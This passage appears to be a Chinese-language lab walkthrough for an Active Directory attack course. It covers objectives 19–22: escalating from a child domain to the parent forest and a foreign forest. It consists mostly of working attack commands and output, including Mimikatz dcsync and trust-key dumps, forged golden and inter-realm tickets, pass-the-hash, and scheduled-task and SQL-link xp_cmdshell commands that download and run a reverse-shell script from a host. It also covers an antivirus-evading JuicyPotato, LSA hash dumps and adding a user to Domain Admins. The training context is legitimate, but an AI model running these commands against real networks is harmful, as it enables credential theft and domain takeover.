        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 2/15/2022 8:06:47 (local)
        End Time:   2/15/2022 18:06:46 (local)
        Renew Time: 2/22/2022 8:06:46 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

使用Mimikatz执行dcsync导出dcorp\krbtgt的哈希
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```


# Learning Objective 19:
Task
● Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using the domain trust key.


## 子域到父域 （一）(CIFS，访问文件系统)

假设已经知道DA管理员Administrator的哈希
```
Administrator: af0686cc0ca8f04df42210c9ac980760
```
打开一个具有DA权限的shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:af0686cc0ca8f04df42210c9ac980760 /run:powershell.exe"'
```

在DA权限的shell下枚举所有Trust tikets
```
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc

Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-280534878-1496970234-700767426)
 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
    * 1/23/2022 11:37:21 PM - CLEAR   - 28 62 25 ae 13 68 18 ad e4 4f b2 7c 22 64 22 9d 8f f7 ac c3 0e 24 2b 09 00 50 4b 35
        * aes256_hmac       ff3616ac06c24395fb76b08d7cc7f0038cd257869b43eb13ebaf9a3061929a1e
        * aes128_hmac       a2ab6e6daf483e61ed6ffa50856ad277
        * rc4_hmac_nt       13d28ca9e5863231c89eda2b2b1756d7
```

伪造一条到父域```moneycorp.local```的TGT

从上面信息我们得知，父域的SID是：```S-1-5-21-280534878-1496970234-700767426```

这里需要注意下面命令参数里的rc4，必须是上面枚举出来的
```* rc4_hmac_nt       13d28ca9e5863231c89eda2b2b1756d7```这个值

不能使用Administrator的NTML

伪造TGT
```
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:13d28ca9e5863231c89eda2b2b1756d7 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\kekeo_old\trust_tkt.kirbi"'
```


TGT文件已保存到```C:\AD\kekeo_old\trust_tkt.kirbi```

制作一张可以访问父域moneycorp.local的TGS

```
PS C:\ad\kekeo_old> .\asktgs.exe C:\AD\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local

  .#####.   AskTGS Kerberos client 1.0 (x86) built on Dec  8 2016 00:31:13
 .## ^ ##.  "A La Vie, A L'Amour"
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)
  '#####'                                                     * * */

Ticket    : C:\AD\kekeo_old\trust_tkt.kirbi
Service   : krbtgt / moneycorp.local @ dollarcorp.moneycorp.local
Principal : Administrator @ dollarcorp.moneycorp.local

> CIFS/mcorp-dc.moneycorp.local
  * Ticket in file 'CIFS.mcorp-dc.moneycorp.local.kirbi'
```

将 TGS 呈现给目标服务

```
PS C:\ad\kekeo_old> .\kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi

  .#####.   KiRBikator 1.1 (x86) built on Dec  8 2016 00:31:14
 .## ^ ##.  "A La Vie, A L'Amour"
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)
  '#####'                                                     * * */

Destination : Microsoft LSA API (multiple)
 < .\CIFS.mcorp-dc.moneycorp.local.kirbi (RFC KRB-CRED (#22))
 > Ticket Administrator@dollarcorp.moneycorp.local-CIFS~mcorp-dc.moneycorp.local@MONEYCORP.LOCAL : injected
```

现在就可以访问目标的文件系统了。如果能够访问，证明我们升级成了父域的DA
```
ls \\mcorp-dc.moneycorp.local\c$
```

### 方法2 （Rubeus.exe）
样可以使用 Rubeus来达到同样的效果，注意我们仍然使用最初生成的TGT.这个可以新开一个student VM测试

```
.\Rubeus.exe asktgs /ticket:C:\AD\kekeo_old\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
```

执行完成以后，访问父域的文件系统

```
ls \\mcorp-dc.moneycorp.local\c$
```


# Learning Objective 20:
Task
● Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to
the parent domain, moneycorp.local using dollarcorp's krbtgt hash.

## 子域到父域 （二）(以用户身份访问，可以执行shell)

这里貌似只能使用krbtgt的账号

下面命令制作一张用户krbtgt到父域的TGT
由于之前我们已经拿到了krbtgt的hash值，这里直接使用
```
PS C:\ad> . .\Invoke-Mimikatz.ps1
PS C:\ad> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\krbtgt_tkt.kirbi"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\krbtgt_tkt.kirbi
User      : Administrator
Domain    : dollarcorp.moneycorp.local (DOLLARCORP)
SID       : S-1-5-21-1874506631-3219952063-538504511
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-280534878-1496970234-700767426-519 ;
ServiceKey: ff46a9d8bd66c6efd77603da26796f35 - rc4_hmac_nt
Lifetime  : 2/16/2022 12:30:00 AM ; 2/14/2032 12:30:00 AM ; 2/14/2032 12:30:00 AM
-> Ticket : C:\AD\krbtgt_tkt.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```

TGT文件已生成在:```C:\AD\krbtgt_tkt.kirbi```

下面命令把TGT注入到mimikatz中
```
Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\krbtgt_tkt.kirbi"'
```

使用下面两个命令之一验证上面操作是否成功
```
gwmi -class win32_operatingsystem -ComputerName mcorp-dc.moneycorp.local
```
或者
```
ls \\mcorp-dc.moneycorp.local\c$
```

利用上面已经取得的权限，为mcorp-dc添加一个定时任务
```
schtasks /create /S mcorp-dc.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User3666" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1''')'"
```

触发定时任务
```
schtasks /Run /S mcorp-dc.moneycorp.local /TN "User3666"
```

收到反弹shell
```
PS C:\ad> .\nc.exe -lnvp 443
listening on [any] 443 ...
connect to [172.16.100.66] from (UNKNOWN) [172.16.1.1] 59665


Windows PowerShell running as user MCORP-DC$ on MCORP-DC
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> hostname
mcorp-dc
PS C:\Windows\system32>
```

记得byopass AMSI

在mcorp-dc，把mimikatz从远程服务器导入到内存中
```
iex (iwr http://172.16.100.66/Invoke-Mimikatz.ps1 -UseBasicParsing)
```

dump出mcorp-dc中的所有用户的哈希

```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```


# Learning Objective 21:
Task
● With DA privileges on dollarcorp.moneycorp.local, get access to SharedwithDCorp share on the DC of eurocorp.local forest.

跨林访问

用Administrator打开一个DA的shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:af0686cc0ca8f04df42210c9ac980760 /run:powershell.exe"'
```

枚举dcorp-dc的所有trust
```
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local

Domain: EUROCORP.LOCAL (ecorp / S-1-5-21-1652071801-1423090587-98612180)
 [  In ] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
    * 1/29/2022 1:20:05 AM - CLEAR   - 1f 6f c4 25 57 c2 50 6e e2 8c b8 94 07 da 97 13 cc 89 5d 6d 0e 47 05 91 74 7c 3a c1
        * aes256_hmac       91df6bcc4a71d585b710532ff73b662d43e4d83a00821f7d509319e4ce1897c5
        * aes128_hmac       47f41fc169b79c34d8af08afa3cfdde9
        * rc4_hmac_nt       cccb3ce736c4d39039b48c79f075a430
```

伪造一条到EUROCORP.LOCAL的TGT
```
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:cccb3ce736c4d39039b48c79f075a430 /service:krbtgt /target:EUROCORP.LOCAL /ticket:C:\AD\kekeo_old\trust_forest_tkt.kirbi"'
```

制作一张可以访问EUROCORP.LOCAL的TGS

```
.\asktgs.exe C:\AD\kekeo_old\trust_forest_tkt.kirbi CIFS/eurocorp-dc.eurocorp.local
```

将 TGS 呈现给目标服务
```
.\kirbikator.exe lsa .\CIFS.eurocorp-dc.eurocorp.local.kirbi
```

枚举eurocorp-dc的分享文件夹
```
PS C:\ad\kekeo_old> Invoke-ShareFinder -ComputerName eurocorp-dc.eurocorp.local
\\eurocorp-dc.eurocorp.local\ADMIN$     - Remote Admin
\\eurocorp-dc.eurocorp.local\C$         - Default share
\\eurocorp-dc.eurocorp.local\IPC$       - Remote IPC
\\eurocorp-dc.eurocorp.local\NETLOGON   - Logon server share
\\eurocorp-dc.eurocorp.local\SharedwithDCorp    -
\\eurocorp-dc.eurocorp.local\SYSVOL     - Logon server share
```

查看目标计算机里的SharedwithDCorp文件夹
```
ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
```

## 方法二（rebuse.exe）


同样的，也可以使用Rubeus.exe，复用上面已经生成的TGT，生成TGS
```
.\Rubeus.exe asktgs /ticket:C:\AD\kekeo_old\trust_forest_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt
```

访问对方林中的计算机
```
ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
```


# Learning Objective 22:
Task
● Get a reverse shell on a SQL server in eurocorp forest by abusing database links from dcorp-mssql.

## 原理
微软的SQL 服务通常部署在一个 Windows 域中
SQL Servers为横向移动提供了非常好的选项，因为域用户可以映射到数据库角色
数据库链接允许 SQL Server 访问外部数据源，如其他SQL Server和OLE DB 数据源
如果数据库链接在 SQL 服务器之间，也就是链接的SQL 服务器，则可以执行存储过程，数据库链接甚至可以对跨林信任有效

枚举当前账号是否对MSSQLSERVER有权限，收集信息
```
PS C:\ad\PowerUpSQL-master> Import-Module .\PowerUpSQL.psd1
WARNING: The names of some imported commands from the module 'PowerUpSQL' include unapproved verbs that might make them
 less discoverable. To find the commands with unapproved verbs, run the Import-Module command again with the Verbose
parameter. For a list of approved verbs, type Get-Verb.
PS C:\ad\PowerUpSQL-master> Get-SQLInstanceDomain |Get-SQLServerInfo 

ComputerName           : dcorp-mssql.dollarcorp.moneycorp.local
Instance               : DCORP-MSSQL
DomainName             : dcorp
ServiceProcessID       : 1724
ServiceName            : MSSQLSERVER
ServiceAccount         : NT AUTHORITY\NETWORKSERVICE
AuthenticationMode     : Windows and SQL Server Authentication
ForcedEncryption       : 0
Clustered              : No
SQLServerVersionNumber : 14.0.1000.169
SQLServerMajorVersion  : 2017
SQLServerEdition       : Developer Edition (64-bit)
SQLServerServicePack   : RTM
OSArchitecture         : X64
OsVersionNumber        : SQL
Currentlogin           : dcorp\student366
IsSysadmin             : No
ActiveSessions         : 1

ComputerName           : dcorp-mssql.dollarcorp.moneycorp.local
Instance               : DCORP-MSSQL
DomainName             : dcorp
ServiceProcessID       : 1724
ServiceName            : MSSQLSERVER
ServiceAccount         : NT AUTHORITY\NETWORKSERVICE
AuthenticationMode     : Windows and SQL Server Authentication
ForcedEncryption       : 0
Clustered              : No
SQLServerVersionNumber : 14.0.1000.169
SQLServerMajorVersion  : 2017
SQLServerEdition       : Developer Edition (64-bit)
SQLServerServicePack   : RTM
OSArchitecture         : X64
OsVersionNumber        : SQL
Currentlogin           : dcorp\student366
IsSysadmin             : No
ActiveSessions         : 1
```

或者检查当前账号是否有权限进入mssql（如果这里枚举没有Accessible的结果，可以重启一下VM）
```
PS C:\ad\PowerUpSQL-master> Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded 


ComputerName                           Instance                                    Status
------------                           --------                                    ------
dcorp-mssql.dollarcorp.moneycorp.local dcorp-mssql.dollarcorp.moneycorp.local,1433 Accessible
dcorp-mssql.dollarcorp.moneycorp.local dcorp-mssql.dollarcorp.moneycorp.local      Accessible
```

只有dcorp-mssql.dollarcorp.moneycorp.local 是Accessible

手动枚举mssql链接
```
PS C:\ad\PowerUpSQL-master> Get-SQLServerLinkCrawl -Instance dcorp-mssql 

Version     : SQL Server 2017
Instance    : DCORP-MGMT
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
User        : sqluser
Links       : {EU-SQL.EU.EUROCORP.LOCAL}

Version     : SQL Server 2017
Instance    : EU-SQL
CustomQuery :
Sysadmin    : 1
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL.EU.EUROCORP.LOCAL}
User        : sa
Links       :
```

下面命令执行whoami命令，mysql实例(根据上面枚举到有权限的结果)指定```dcorp-mssql.dollarcorp.moneycorp.local```

```
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'whoami'"
```

执行
```
PS C:\ad\PowerUpSQL-master> Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'whoami'"


Version     : SQL Server 2017
Instance    : DCORP-MGMT
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
User        : sqluser
Links       : {EU-SQL.EU.EUROCORP.LOCAL}

Version     : SQL Server 2017
Instance    : EU-SQL
CustomQuery : {nt authority\network service, }
Sysadmin    : 1
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL.EU.EUROCORP.LOCAL}
User        : sa
Links       :
```

在最后一组的CustomQuery里打印出了whoami命令的执行结果：```nt authority\network service```

下面命令触发一个反弹shell
```
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1'')"'
```

收到反弹shell
```
PS C:\ad> . .\powercat.ps1
PS C:\ad> powercat -l -v -p 443 -t 100
VERBOSE: Set Stream 1: TCP
VERBOSE: Set Stream 2: Console
VERBOSE: Setting up Stream 1...
VERBOSE: Listening on [0.0.0.0] (port 443)
VERBOSE: Connection from [172.16.15.17] port  [tcp] accepted (source port 50292)
VERBOSE: Setting up Stream 2...
VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...

Windows PowerShell running as user EU-SQL$ on EU-SQL
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>PS C:\Windows\system32> whoami
nt authority\network service
PS C:\Windows\system32> hostname
eu-sql
```
## 提权

枚举eurocorp.local里面的所有域
```
PS C:\users\public\Downloads> Get-NetForestDomain -Forest eurocorp.local


Forest                  : eurocorp.local
DomainControllers       : {eurocorp-dc.eurocorp.local}
Children                : {eu.eurocorp.local}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : eurocorp-dc.eurocorp.local
RidRoleOwner            : eurocorp-dc.eurocorp.local
InfrastructureRoleOwner : eurocorp-dc.eurocorp.local
Name                    : eurocorp.local

Forest                  : eurocorp.local
DomainControllers       : {eu-dc.eu.eurocorp.local}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : eurocorp.local
PdcRoleOwner            : eu-dc.eu.eurocorp.local
RidRoleOwner            : eu-dc.eu.eurocorp.local
InfrastructureRoleOwner : eu-dc.eu.eurocorp.local
Name                    : eu.eurocorp.local
```

父域：eurocorp.local
子域：eu.eurocorp.local


枚举eurocorp.local里面的所有用户
```
PS C:\users\public\Downloads> get-netuser -domain eurocorp.local|select cn

cn
--
Administrator
Guest
DefaultAccount
krbtgt
```

枚举eurocorp.local里面的所有计算机

```
PS C:\users\public\Downloads> Get-NetComputer -domain eurocorp.local
eurocorp-dc.eurocorp.local
PS C:\users\public\Downloads> Get-NetComputer -domain eu.eurocorp.local
eu-dc.eu.eurocorp.local
eu-sql.eu.eurocorp.local
```

父域DC： eurocorp-dc.eurocorp.local
子域DC：eu-dc.eu.eurocorp.local
子域机器： eu-sql.eu.eurocorp.local


枚举eurocorp.local DA管理员
```
PS C:\users\public\Downloads> Get-NetGroupMember -GroupName "Domain Admins" -Recurse -domain eu.eurocorp.local


GroupDomain  : eu.eurocorp.local
GroupName    : Domain Admins
MemberDomain : eu.eurocorp.local
MemberName   : Administrator
MemberSID    : S-1-5-21-2745303235-1478049046-1952051811-500
IsGroup      : False
MemberDN     : CN=Administrator,CN=Users,DC=eu,DC=eurocorp,DC=local
```


这边查询到当前账号有SeImpersonatePrivilege的能力，可以使用JuicyPotato提权
```
Kerberos support for Dynamic Access Control on this device has been disabled.
PS C:\users\public\downloads> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```


但是每次JuicyPotato传过去都会被杀掉，然后搞了好久，后面去OSED备考群里问红队大佬有没有思路，大佬给了一个加壳的JuicyPotato，可以成功执行！

```
.\LTD.exe -l 4433 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://172.16.100.66/Invoke-PowerShellTcp.ps1')" -t *
```

收到system权限的shell
```
PS C:\ad> .\nc.exe -lnvp 4433
listening on [any] 4433 ...
connect to [172.16.100.66] from (UNKNOWN) [172.16.15.17] 50372
Windows PowerShell running as user EU-SQL$ on EU-SQL
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
nt authority\system
PS C:\Windows\system32> hostname
eu-sql
PS C:\Windows\system32>
```

## 域权限提升
bypass ps policy和AMSI

引入mimikatz，导出本地所有哈希
```
PS C:\users\Administrator\desktop> Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # lsadump::lsa /patch
Domain : EU-SQL / S-1-5-21-3746007229-4038020768-3333387724

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : cdcfd73ba273d2b6ab67f1fecd83e88e

RID  : 000001f7 (503)
User : DefaultAccount
LM   :
NTLM :

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :
```
开blooodhound，发现本机有DA账号Administrator的session，用Mimikatz导出所有哈希

执行Invoke-Mimikatz获得的哈希
```
SQLTELEMETRY: 72653ab8f396dd2228e0cd56b957e4fa
EU-SQL$: 72653ab8f396dd2228e0cd56b957e4fa
Administrator:cdcfd73ba273d2b6ab67f1fecd83e88e
dbadmin: 0553b02b95f64f7a3c27b9029d105c27
```

但是开一个新的shell进去，发现这个其实是本地的Administrator，感觉blooodhound有时候也不太准啊。。


iex (iwr http://172.16.100.66/PowerView.ps1 -UseBasicParsing)

iex (iwr http://172.16.100.66/PowerView_dev.ps1 -UseBasicParsing)

iex (iwr http://172.16.100.66/SharpHound.ps1 -UseBasicParsing)

iex (iwr http://172.16.100.66/Invoke-Mimikatz.ps1 -UseBasicParsing)

Invoke-Mimikatz -Command '"sekurlsa::pth /user:SQLTELEMETRY /domain:eu.eurocorp.local /ntlm:72653ab8f396dd2228e0cd56b957e4fa /run:powershell.exe"'

Invoke-Mimikatz -Command '"sekurlsa::pth /user:dbadmin /domain:eu.eurocorp.local /ntlm:0553b02b95f64f7a3c27b9029d105c27 /run:powershell.exe"'

Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:eu.eurocorp.local /ntlm:cdcfd73ba273d2b6ab67f1fecd83e88e /run:powershell.exe"'


net group "Domain Admins" dbadmin /ADD /DOMAIN

(New-Object System.Net.WebClient).DownloadFile("http://172.16.100.66/SharpHound.ps1", "C:\Users\dbadmin\Documents\SharpHound.ps1")

powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.66/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.66  -Port 443"


Enter-PSSession eu-sql.eu.eurocorp.local

Enter-PSSession –Computername eu-dc.eu.eurocorp.local –credential eu\Administrator:cdcfd73ba273d2b6ab67f1fecd83e88e

Enter-PSSession eu-dc.eu.eurocorp.local

Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName eu-dc.eu.eurocorp.local

Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

python.exe C:\ad\kerberoast\tgsrepcrack.py C:\ad\kerberoast\10k-worst-pass.txt 


Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\dbadmin\Documents\[0;3e7]-2-0-60a10000-EU-SQL$@krbtgt-EU.EUROCORP.LOCAL.kirbi"'


Invoke-Command -ScriptBlock{whoami;hostname} -computername eu-dc.eu.eurocorp.local

Invoke-Bloodhound -CollectionMethod All -Domain eu.eurocorp.local

.\SharpHound.exe  --disablekerberossigning --CollectionMethod All --Domain eu.eurocorp.local

Invoke-BloodHound -CollectionMethod All -Domain eu.eurocorp.local


Invoke-Mimikatz -Command '"sekurlsa::tickets"'